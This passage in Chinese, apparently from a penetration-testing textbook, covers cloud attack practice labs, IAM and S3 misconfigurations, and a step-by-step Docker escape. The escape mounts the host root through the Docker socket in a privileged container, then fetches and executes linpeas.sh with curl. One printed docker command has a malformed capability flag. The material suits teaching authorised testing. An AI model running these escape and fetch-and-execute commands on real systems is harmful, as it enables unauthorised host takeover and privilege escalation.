Scott Piper 创建的 http://flaws.cloud 站点。这个故意易受攻击的站点及其姊妹站点 http://flaws2.cloud 是练习云渗透测试技能的绝佳资源。

使用 Rhino Security Labs 开发的 CloudGoat 来创建一个易受攻击的云部署。你可以在 https://github.com/RhinoSecurityLabs/cloudgoat 找到源代码。

Kubernetes Goat，这是一个为培训目的而创建的故意易受攻击的集群环境，
    https://github.com/madhukula/kubernetes-goat

利用其他云解决方案，如微软的 Azure Blob 存储，你可以使用像 Az-Blob-Attacker（https://github.com/VithalS/Az-Blob-Attacker）这样的工具。

要自动化本章描述的 Docker 权限提升步骤，请参阅 stealthchapter 的 `deepce` 脚本（https://github.com/stealthchapter/deepce）和 PercussiveElbow 的 `docker-escape-tool`（https://github.com/PercussiveElbow/docker-escape-tool）。

### 身份与访问管理

身份与访问管理（IAM）工具定义了帐户的访问级别。IAM 控制认证（谁可以访问资源）和授权（他们可以执行哪些操作，通常称为权限）。

管理员可以通过使用 IAM 仔细创建用户、组、角色、权限和策略来加固云环境。然而，IAM 的错误配置可能导致漏洞。例如，Cognito 是亚马逊网络服务（AWS）的一项服务，允许开发人员为他们构建的应用程序实现身份和访问管理。一个名为 Cognito Scanner 的工具允许你扫描该服务的错误配置。你可以在 https://github.com/padok-team/cognito-scanner 找到该工具。

与使用 Cognito 相关的漏洞属于更广泛的 Web API 漏洞类别，你可以在 Corey J. Ball 所著的《Hacking APIs: Breaking Web Application Programming Interfaces》（No Starch Press，2022）中了解更多信息。

### 无服务器函数

无服务器函数（也称为云函数）允许开发人员运行服务器代码，而无需设置虚拟机。相反，开发人员编写他们的服务器端逻辑，云环境处理其余部分。每个云平台都有自己的此功能版本。例如，AWS 称其无服务器函数为 lambda 函数。

当用户向实现此函数的云服务发出 API 请求时，AWS API 网关会将请求转发给 lambda 函数。因此，每当 HTTP 请求到达 API 时，lambda 就会被触发。

`context` 变量提供有关调用 lambda 函数的环境信息。例如，它包含 `aws_request` 中的 `quote` 查询字符串参数。

在运行 lambda 函数之前，我们需要通过向 AWS API 网关注册函数，告诉 AWS 将传入的 HTTP GET 请求注入到函数的 `event` 参数中。我们可以通过几次点击来完成此操作，如 AWS 官方文档所述：https://docs.aws.amazon.com/lambda/latest/dg/services-apigateway.html。

无服务器函数容易受到多个安全问题的影响。要探索这些问题，请查看 OWASP 的 Serverless Goat，这是一个故意存在漏洞的无服务器应用程序。OWASP 还维护了无服务器应用程序中十大最关键漏洞的列表。

### 存储

像 Amazon Simple Storage Service（S3）这样的公共云存储解决方案可能存在错误配置，允许攻击者访问存储的数据。如果在渗透测试期间你可以获得 AWS 云帐户的凭据，你可以使用 Metasploit 的 `enum_s3` 模块枚举其 S3 存储桶（存储单元）。

MSF:
- `msf > use auxiliary/cloud/aws/enum_s3`

Awesome AWS S3 Security git 仓库（https://github.com/mxm0z/awesome-sec-s3）列出了用于识别和利用 S3 错误配置的大量工具集合。

### Docker 容器

如果我们想编写一个使用外部库的 lambda 函数，该怎么办？我们需要一种方法将库与 lambda 函数捆绑在一起，以便将它们作为单个包部署到云环境中。

Docker 通过将应用程序及其所有依赖项捆绑到一个称为 Docker 镜像的单个包中，使应用程序能够在隔离环境中运行。这种隔离确保无论部署环境是你的本地机器还是云，应用程序都能一致地执行。

Docker 容器是这些镜像的可运行实例，使用 Docker 引擎创建和管理。Docker 引擎是一个客户端/服务器应用程序，由一个长期运行的守护进程、一个用于与守护进程交互的 REST API 和一个命令行界面客户端组成。

Docker 套接字是 Docker 守护进程使用的 Unix 套接字，作为 Docker 命令的端点，允许容器与守护进程通信、执行命令并接收响应。

#### 逃逸 Docker 容器

当攻破 Docker 容器，容器将我们与托管它的虚拟服务器隔离开。如果容器配置正确，攻击者应该无法访问虚拟主机或其运行的任何其他容器上的信息。让我们看看我们是否能逃逸容器，在主机服务器上运行命令并访问其他容器。

我们将首先查找容器权限中的错误配置，因为特权容器通过 Docker 套接字与 Docker 守护进程通信。攻击者可以使用 Docker 套接字指示守护进程创建一个挂载到主机文件系统根目录的新容器，然后读取、写入和修改主机系统上的文件。

让我们检查容器是否有权访问 Docker 套接字。

```bash
find / -name docker.sock 2>/dev/null
/var/run/docker.sock
```

看起来我们有权访问 Docker 套接字。检查我们是否在特权容器中运行的另一种方法是使用 `docker info` 命令。

现在，我们将尝试指示守护进程给我们一个镜像列表。这里，我们指定了套接字的路径，但如果套接字在 run 目录中，通常不需要指定：

```bash
docker -H unix:///var/run/docker.sock image ls
```

查看这个镜像列表，看看是否能找到一个可以用于访问主机文件系统的镜像。我们正在寻找一个 Unix 或 Windows 容器。如果不存在合适的容器，我们使用 `docker pull` 下载并安装一个

```bash
docker pull alpine:latest
```

接下来，我们通过运行以下命令指示 Docker 守护进程在 Alpine Linux 容器中创建一个名为 `host` 的文件夹，并将其映射到主机上的根目录：

```bash
docker run -v /:/host --rm -it --privileged alpine cap-add=ALL chroot /host bash
```

`chroot` 命令将使映射的 `/host` 文件夹成为我们的默认根目录。我们通过使用 `--privileged` 和 `cap-add=ALL` 标志创建了一个具有所有能力的特权容器。

要找到其他权限提升途径，请运行特权提升 Awesome 脚本套件（PEASS）。将 PEASS 下载到容器中：

```bash
curl -k -OL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas.out
```

PEASS 应该允许你快速审计 Docker 容器并识别错误配置，以及容器逃逸或权限提升的机会。PEASS 的作者开发了一个后渗透 Metasploit 模块。你可以通过运行以下命令将其添加到你的环境中：

```bash
kali@kali:~$ sudo wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/Metasploit/peass.rb
msf > reload_all
```

下载脚本后，运行 `reload_all` 命令使其在框架中可用。

### Kubernetes

复杂的软件应用程序通常使用一组相互连接的 Docker 容器，这种设计方法称为微服务架构。为了确保这些 Docker 容器能够正确地相互交互，它们通常依赖于编排工具 Kubernetes，这是一个由 Google 开发的强大平台，用于管理容器化服务。DevOps 工程师和软件开发人员必须精确配置 Kubernetes，因为任何错误配置都可能引入安全漏洞。

云安全领域是动态且快速发展的。因此，我们不会在这里介绍 Kubernetes 的漏洞利用。对于那些热衷于深入了解 Kubernetes 的人，可以参阅 Kubernetes Goat，这是一个为培训目的而创建的故意易受攻击的集群环境，可在 https://github.com/madhukula/kubernetes-goat 获得。